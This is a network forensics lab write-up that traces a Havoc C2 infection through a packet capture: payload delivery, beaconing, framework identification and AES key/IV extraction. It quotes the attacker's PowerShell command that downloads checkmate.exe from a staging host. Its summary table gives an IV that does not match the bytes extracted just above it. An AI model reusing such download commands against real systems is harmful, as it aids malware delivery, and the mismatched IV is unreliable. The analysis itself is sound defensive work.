# 🔴 Hunting Havoc C2 — Network Forensics Investigation

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Attack Type](https://img.shields.io/badge/Attack-C2%20%7C%20Malware%20Delivery%20%7C%20Lateral%20Movement-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1071%20%7C%20T1059%20%7C%20T1105%20%7C%20T1570-blue?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **File** | mal01.pcapng |
| **Date** | February 05, 2026 |
| **Target** | 10.0.0.156 (Victim Machine) |
| **Attacker Infrastructure** | 10.0.0.155 / 185.53.179.200 / ww38.bobmovies.us |
| **C2 Framework** | Havoc C2 — Demon Agent |
| **Payload** | checkmate.exe (99 KB) |
| **Severity** | 🔴 Critical |
| **Status** | Full compromise confirmed — administrative access achieved |

---

## 🎯 Scenario

This investigation focuses on analyzing malicious network traffic associated with a Command and Control (C2) framework. The objective was to perform packet analysis on a PCAP file to:

- ✅ Identify indicators of compromise
- ✅ Identify the C2 framework involved
- ✅ Extract cryptographic keys (AES Key and IV)
- ✅ Decrypt encrypted C2 communications
- ✅ Reveal attacker commands and access level

The lab demonstrates real-world techniques used by security analysts to investigate suspected malware infections and understand attacker activities through network forensics.

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| `mal01.pcapng` | Full network packet capture of the compromise |

---

## 📚 Resources

| Resource | Link |
|---|---|
| Havoc C2 Framework | [GitHub — HavocFramework](https://github.com/HavocFramework/Havoc) |
| Havoc Defines.h | [DEMON_MAGIC_VALUE](https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/include/Defines.h) |
| Havoc AesCrypt.h | [CTR Mode](https://github.com/HavocFramework/Havoc) |
| MITRE T1071.001 | [Application Layer Protocol](https://attack.mitre.org/techniques/T1071/001/) |
| MITRE T1105 | [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) |
| MITRE T1059.001 | [PowerShell](https://attack.mitre.org/techniques/T1059/001/) |
| MITRE T1570 | [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/) |
| CyberChef | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) |
| VirusTotal | [virustotal.com](https://www.virustotal.com) |

---

## 🔍 Investigation Methodology
```
Step 1 → Protocol Analysis     (what traffic exists in the PCAP?)
Step 2 → HTTP Traffic Analysis (find suspicious requests and payloads)
Step 3 → Payload Extraction    (export and hash the malware)
Step 4 → C2 Identification     (identify the framework from signatures)
Step 5 → Beaconing Analysis    (confirm C2 heartbeat pattern)
Step 6 → Key Extraction        (extract AES key and IV from packets)
Step 7 → Decryption            (decrypt C2 communications in CyberChef)
```

---

## 🕵️ Investigation

### Step 1 — Protocol Hierarchy Analysis

The first thing I did was open the PCAP in Wireshark and run a protocol hierarchy analysis to understand what traffic existed before touching any individual packet.
```
Wireshark → Statistics → Protocol Hierarchy
```
><img width="977" height="457" alt="1m" src="https://github.com/user-attachments/assets/f0d3b61c-e92f-466c-9f1e-c988cf2633f2" />

| Protocol | Packets | % | Observation |
|---|---|---|---|
| **TCP** | 11,030 | 98.4% | Almost all traffic is TCP |
| **TLS** | 6,634 | 59.2% | Majority is encrypted — C2 hides in HTTPS |
| **HTTP** | 158 | 1.4% | Small but critical — cleartext entry point |
| **DNS** | 138 | 1.2% | Domain resolution — will reveal C2 domains |

TLS at 59.2% means most C2 communication is encrypted. The 158 HTTP packets are the entry point — that is where the story starts.

---

### Step 2 — HTTP Traffic Analysis

I filtered for HTTP traffic:
```
Filter: http
```
> <img width="1201" height="215" alt="2m" src="https://github.com/user-attachments/assets/0a9f479e-f933-445d-909c-05da369a881a" />

Immediately several things stood out:

#### Finding  — Malware Delivery 🚨🚨
```
GET /checkmate.exe HTTP/1.1
Source: 10.0.0.156 → 10.0.0.155:8000
Response: HTTP/1.0 200 OK (application/x-msdos-program)
```

An internal server at `10.0.0.155` served a Windows executable to the victim. `10.0.0.155` was already compromised — the attacker used it as an internal staging server.

---

### Step 3 — Payload Extraction and Hashing

I exported `checkmate.exe` directly from Wireshark:
```
File → Export Objects → HTTP → checkmate.exe → Save
```

Then calculated the hash:
```powershell
Get-FileHash -Algorithm MD5 checkmate.exe
```
> <img width="915" height="317" alt="2mm" src="https://github.com/user-attachments/assets/78894e85-06d0-4cdb-8b9e-7c0d4fb53dd3" />

```
MD5: 55DF2A3DD566B967E5F5141936724C7B
```

Submitted to **VirusTotal** — no matches found.

> <img width="811" height="344" alt="3m" src="https://github.com/user-attachments/assets/eb2e231a-b587-4a92-84da-9835760b7098" />


| Result | Meaning |
|---|---|
| Found on VirusTotal | Known commodity malware |
| **Not found on VirusTotal** | **Custom compiled implant — targeted attack** |

The attacker compiled `checkmate.exe` specifically for this operation.

---
### Step 4 — Following the TCP Stream

I followed the TCP stream of the `checkmate.exe` download:
```
Right click packet 4960 → Follow → TCP Stream
```

> <img width="609" height="160" alt="3m4" src="https://github.com/user-attachments/assets/dd199e00-66f3-4475-abe4-1cb375a58305" />

```
GET /checkmate.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1432
Host: 10.0.0.155:8000

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.12.8
Content-type: application/x-msdos-program
Content-Length: 99328
```

Three critical findings in one stream:

**1 — PowerShell User-Agent**

This was not a browser. **PowerShell** downloaded `checkmate.exe` — meaning the attacker executed something like:
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.0.0.155:8000/checkmate.exe','checkmate.exe')
```

**2 — Python SimpleHTTP Staging Server**
```
Server: SimpleHTTP/0.6 Python/3.12.8
```

The attacker hosted the payload using:
```bash
python3 -m http.server 8000
```

Not a legitimate web server. An attacker's staging server running inside the network on port 8000.

**3 — Internal IP = Lateral Movement**
```
Host: 10.0.0.155:8000
```

Payload came from an internal IP. `10.0.0.155` was already compromised before this traffic. The attacker pivoted from `.155` to deliver the implant to `.156`.

---

### Step 5 — C2 Beaconing Pattern

After `checkmate.exe` was delivered I filtered traffic between the two internal IPs:
```
Filter: http && ip.addr == 10.0.0.155 && ip.addr == 10.0.0.156
```

> <img width="594" height="350" alt="5m" src="https://github.com/user-attachments/assets/2910d907-c0c1-4b8a-ba67-338ef390a1b6" />

The pattern was immediately obvious:
```
6418  →  10.0.0.156 → 10.0.0.155   POST  287 bytes   ← registration beacon
6421  →  10.0.0.155 → 10.0.0.156   HTTP  174 bytes   200 OK
6572  →  10.0.0.156 → 10.0.0.155   POST   74 bytes   ← heartbeat
6574  →  10.0.0.155 → 10.0.0.156   HTTP  182 bytes   200 OK
6685  →  10.0.0.156 → 10.0.0.155   POST   74 bytes   ← heartbeat
6687  →  10.0.0.155 → 10.0.0.156   HTTP  182 bytes   200 OK
```

| Observation | Conclusion |
|---|---|
| Same 74 byte size every POST | Automated heartbeat — not human activity |
| ~2 second interval | C2 sleep timer configured at 2 seconds |
| Always POST | C2 communication protocol |
| First beacon 287 bytes | Registration — victim introducing itself to C2 |

To visualize this I used Wireshark's I/O Graph:
```
Statistics → I/O Graph
Filter: http && ip.addr == 10.0.0.155 && ip.addr == 10.0.0.156
```

> <img width="613" height="244" alt="6mm" src="https://github.com/user-attachments/assets/e7b82872-28d8-4971-ad56-9818f40051c5" />

```
0 – 43 seconds    →  flat line       ← no C2 activity
~43 seconds       →  single spike    ← checkmate.exe downloaded
50 – 179 seconds  →  perfect rhythm  ← C2 heartbeat, never stops
```

Machine precision. Every 2 seconds. This is what active C2 looks like on a network.

---
### Step 6 — Identifying the C2 Framework

I examined the raw bytes of the first POST request:

> <img width="613" height="203" alt="8m" src="https://github.com/user-attachments/assets/a5b25d60-c92d-4df9-ad69-ce45b0eded19" />



```
... e5 de ad be ef 08 75 ...
```

The magic bytes **`DE AD BE EF`** — `0xDEADBEEF`.

I checked the Havoc C2 source code on GitHub:
```
Havoc C2 Repository → payloads/Demon/include/Defines.h
```

> <img width="402" height="407" alt="9m" src="https://github.com/user-attachments/assets/ca8d0f5c-33ca-4a8b-8c5e-5365a1d25de2" />

```c
#define DEMON_MAGIC_VALUE   0xDEADBEEF
```

**Perfect match. C2 framework confirmed: Havoc C2 — Demon Agent.**

#### What Is Havoc C2?

| Feature | Detail |
|---|---|
| Agent | Demon — compiled Windows PE |
| Communication | HTTP / HTTPS / SMB |
| Encryption | AES with CTR mode — per session keys |
| Magic bytes | `0xDEADBEEF` in every packet |
| Evasion | Sleep masking, AMSI bypass, ETW patching |

---

### Step 7 — AES Key and IV Extraction

#### Understanding AES Key and IV

**AES Key:** The secret cryptographic key used to encrypt and decrypt all C2 communication. In Havoc C2 this key is embedded in the implant at compile time.

**IV (Initialization Vector):** A random value used alongside the AES key to ensure identical plaintext messages produce different ciphertext. Without it, patterns in encrypted traffic become visible.

**Why they matter:** Without the AES key and IV, all POST request data appears as random bytes. Extracting these values allows us to decrypt the C2 traffic and reveal exactly what commands were sent.

#### Havoc C2 Packet Structure
```
Find DEADBEEF → skip 12 bytes → next 32 bytes = AES Key → next 16 bytes = IV
```

#### Extraction Process

I selected packet 6418, copied the bytes as a Hex Dump, and pasted into Notepad:

> <img width="526" height="326" alt="8mm" src="https://github.com/user-attachments/assets/4401580f-b5d1-4917-ab8a-75ea4981040c" />
> <img width="564" height="375" alt="14" src="https://github.com/user-attachments/assets/4989f492-95e7-428d-8fa2-755972902a69" />
**Locate magic bytes:**
```
... e5 de ad be ef ...
```

**Skip 12 bytes after DEADBEEF:**
```
08 75 c2 54 00 00 63 00 00 00 00 08   ← skip these
```

**Next 32 bytes = AES Key:**
```
da 26 84 0e c4 d8 c2 3e 32 5e ea e6
ea e6 48 f6 5a 2c d0 48 50 6e 64 32
dc d2 c4 76 86 d6 8a 9a
```

> <img width="498" height="387" alt="13" src="https://github.com/user-attachments/assets/62160f8a-3805-41e5-ba47-44bce9ef1d2e" />




**Next 16 bytes = AES IV:**
```
f8 84 b0 68 dc 38 d0 2c a6 b2 ca 2c 8e 96 82 8f
```

> <img width="534" height="355" alt="155" src="https://github.com/user-attachments/assets/984763fd-2468-4d86-9897-c9a61b472ab3" />


| Parameter | Value |
|---|---|
| **AES Key** | `da26840ec4d8c23e325eeae6eae648f65a2cd048506e6432dcd2c47686d68a9a` |
| **AES IV** | `9af884b068dc38d02ca6b2ca2c8e9682` |
| **Mode** | CTR — confirmed in Havoc AesCrypt.h |

---
